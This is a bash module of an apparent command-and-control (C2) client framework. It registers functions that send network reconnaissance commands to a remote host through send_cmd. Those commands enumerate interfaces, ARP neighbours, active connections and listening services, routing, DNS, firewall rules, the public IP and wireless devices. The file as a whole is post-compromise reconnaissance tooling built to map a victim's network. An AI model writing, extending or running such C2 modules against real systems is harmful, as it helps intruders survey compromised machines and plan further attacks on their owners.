#!/usr/bin/env bash
#c2-client module
#SDirSxobYJ
#network

source funcmgr.sh

SDirSxobYJ_init() {
  register_function "net_summary" "network_summary" 0 "Network summary (grouped)"
  register_function "net_local" "network_local" 0 "Local interface & hardware info"
  register_function "net_conn" "network_connections" 0 "Active connections & listeners"
  register_function "net_conf" "network_config" 0 "Routing, DNS, firewall configuration"
  register_function "net_tools" "network_tools" 0 "Aux network tools (traceroute, external IP, wireless)"
}

SDirSxobYJ_main() {
  :
}

SDirSxobYJ_description() {
  echo -e "Network tools module"
}

SDirSxobYJ_help() {
  echo -e "${BLUE}net_summary${NC} quick summary (runs groups)"
  echo -e "${BLUE}net_local${NC}  interfaces, ARP, hostname"
  echo -e "${BLUE}net_conn${NC}  active connections & listeners"
  echo -e "${BLUE}net_conf${NC}  routing, DNS, firewall, throughput"
  echo -e "${BLUE}net_tools${NC}  traceroute/ping, external IP, wireless info"
}

# --- helper: try cmds with fallback ------------------------------------------------
# Usage: run_try "cmd1 || cmd2 || cmd3"
# We wrap into send_cmd so remote execution is consistent.
run_try() {
  local cmd="$*"
  send_cmd "${cmd}"
}

# --- Group: local ---------------------------------------------------------
# interfaces, arp, hostname, macs
network_local() {
  echo -e "${GREEN}[*]${YELLOW} Local network & hardware:${NC}"

  echo -e "${GREEN}[+]${YELLOW} Interfaces (ip/ifconfig or /sys):${NC}"
  run_try "ip addr show 2>/dev/null || ifconfig -a 2>/dev/null || (ls /sys/class/net 2>/dev/null && for i in /sys/class/net/*; do echo; echo \"Interface: \$(basename \$i)\"; cat \$i/address 2>/dev/null || true; done) || echo 'No interface info available'"
  echo

  echo -e "${GREEN}[+]${YELLOW} ARP / neighbours:${NC}"
  run_try "ip neigh show 2>/dev/null || arp -a 2>/dev/null || (cat /proc/net/arp 2>/dev/null || echo 'No ARP info')"
  echo

  echo -e "${GREEN}[+]${YELLOW} Hostname / Domain:${NC}"
  run_try "hostname -f 2>/dev/null || hostname 2>/dev/null || echo 'No hostname'"
  run_try "dnsdomainname 2>/dev/null || domainname 2>/dev/null || echo 'No domain info'"
  echo
}

# --- Group: connections --------------------------------------------------
# active connections, socket summary, listening services
network_connections() {
  echo -e "${GREEN}[*]${YELLOW} Connections & sockets:${NC}"

  echo -e "${GREEN}[+]${YELLOW} Active connections (ss/netstat/proc fallback):${NC}"
  run_try "ss -tunap 2>/dev/null || netstat -tunap 2>/dev/null || (echo 'Parsing /proc/net/tcp and /proc/net/udp'; awk 'NR>1{print}' /proc/net/tcp 2>/dev/null | head -n 20)"
  echo

  echo -e "${GREEN}[+]${YELLOW} Listening services:${NC}"
  run_try "ss -tulpn 2>/dev/null || netstat -tulpn 2>/dev/null || (lsof -i -sTCP:LISTEN 2>/dev/null | head -n 20) || echo 'No listeners found'"
  echo

  echo -e "${GREEN}[+]${YELLOW} Socket summary (counts):${NC}"
  run_try "ss -s 2>/dev/null || netstat -s 2>/dev/null || echo 'No socket stats available'"
  echo
}

# --- Group: config -------------------------------------------------------
# routing, DNS, firewall, throughput (/proc)
network_config() {
  echo -e "${GREEN}[*]${YELLOW} Network configuration:${NC}"

  echo -e "${GREEN}[+]${YELLOW} Routing table:${NC}"
  run_try "ip route show 2>/dev/null || route -n 2>/dev/null || echo 'No routing tools available'"
  echo

  echo -e "${GREEN}[+]${YELLOW} DNS configuration:${NC}"
  run_try "grep -v '^#' /etc/resolv.conf 2>/dev/null | grep -v '^$' || echo 'No /etc/resolv.conf'"
  echo

  echo -e "${GREEN}[+]${YELLOW} Firewall/nat (iptables/nft/ufw):${NC}"
  run_try "iptables -L -n 2>/dev/null || nft list ruleset 2>/dev/null || ufw status 2>/dev/null || firewall-cmd --state 2>/dev/null || echo 'No firewall management tools available'"
  echo

  echo -e "${GREEN}[+]${YELLOW} Network throughput (/proc/net/dev):${NC}"
  # show top lines from /proc/net/dev — lightweight, always available on Linux
  run_try "awk 'NR==1 || NR==2 || NR==3 || NR==4 {print}' /proc/net/dev 2>/dev/null || cat /proc/net/dev 2>/dev/null || echo 'No /proc/net/dev'"
  echo
}

# --- Group: tools --------------------------------------------------------
# traceroute/ping (light), external IP, wireless
network_tools() {
  echo -e "${GREEN}[*]${YELLOW} Network tools & external checks:${NC}"

  # traceroute / tracepath fallback to ping (limited)
  echo -e "${GREEN}[+]${YELLOW} Traceroute (limited):${NC}"
  run_try "traceroute -m 5 8.8.8.8 2>/dev/null || tracepath -m 5 8.8.8.8 2>/dev/null || (ping -c1 -W1 8.8.8.8 2>/dev/null && echo 'No traceroute installed; ping to 8.8.8.8 succeeded') || echo 'No traceroute/ping available'"
  echo

  # external IP: try curl/wget, then dig to OpenDNS
  echo -e "${GREEN}[+]${YELLOW} External IP (public):${NC}"
  run_try "curl -s --max-time 5 ifconfig.me || wget -qO- --timeout=5 ifconfig.me || dig +short myip.opendns.com @resolver1.opendns.com 2>/dev/null || (nslookup myip.opendns.com resolver1.opendns.com 2>/dev/null | awk '/^Address:/{print \$2}' | tail -n1) || echo 'External IP lookup unavailable'"
  echo

  # wireless info (if present)
  echo -e "${GREEN}[+]${YELLOW} Wireless info (if any):${NC}"
  run_try "iwconfig 2>/dev/null | grep -v 'no wireless' || nmcli dev wifi list 2>/dev/null || (for d in /sys/class/net/*; do test -e \$d/wireless && echo Wireless device: \$(basename \$d); done) || echo 'No wireless tools/links found'"
  echo
}

# --- Single combined summary that uses groups --------------------------------
network_summary() {
  network_local
  network_connections
  network_config
  network_tools
}
